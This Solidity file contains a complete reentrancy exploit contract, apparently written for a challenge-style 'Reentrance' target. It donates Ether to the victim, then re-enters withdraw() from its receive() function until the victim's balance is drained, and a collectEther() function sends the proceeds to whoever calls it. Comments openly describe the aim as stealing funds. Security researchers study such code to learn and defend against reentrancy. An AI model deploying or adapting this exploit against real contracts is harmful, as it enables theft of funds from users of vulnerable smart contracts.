// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256);
}

contract ReentrancyAttack {
    IReentrance public vulnerableContract;
    uint256 public amountToSteal;

    constructor(address _vulnerableContractAddress) public {
        vulnerableContract = IReentrance(_vulnerableContractAddress);
    }

    // Attack function to start the process
    function attack() external payable {
        require(msg.value > 0, "You must send some Ether to initiate the attack.");
        amountToSteal = msg.value;
        vulnerableContract.donate{value: msg.value}(address(this)); // Donate Ether to the contract
        vulnerableContract.withdraw(msg.value); // Trigger the first withdraw
    }

    // This is where the re-entrancy happens
    receive() external payable {
        if (address(vulnerableContract).balance >= amountToSteal) {
            vulnerableContract.withdraw(amountToSteal); // Re-enter the contract to keep withdrawing
        }
    }

    // Withdraw Ether from the attack contract to your wallet
    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
